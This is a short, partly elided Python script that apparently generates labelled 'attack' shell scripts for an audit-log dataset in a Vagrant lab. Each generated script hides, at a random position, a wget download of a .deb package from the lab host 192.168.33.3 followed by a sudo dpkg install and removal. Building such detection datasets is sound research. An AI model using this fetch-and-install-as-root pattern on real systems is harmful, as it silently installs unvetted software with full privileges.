print """
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
This python file generates wget scripts for attacks				   					 			+
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
"""
...
for i in range(25):
	filename = "attack/wget-exploit-" + str(i) + ".sh"
	...
	attack_pos = randint(0, 29)
	for n in range(30):
		if n == attack_pos:
			output.write("/usr/local/bin/wget 192.168.33.3/ipscan_3.5.5_amd64.deb\n")
			install_str = "sudo dpkg -i ipscan_3.5.5_amd64.deb\n"
			output.write(install_str)
			rm_str = "rm ipscan_3.5.5_amd64.deb \n"
			output.write(rm_str)
		else:
	...
	copy_data = "cp /tmp/audit.log /vagrant/data/wget-attack-" + str(i) + ".log\n"
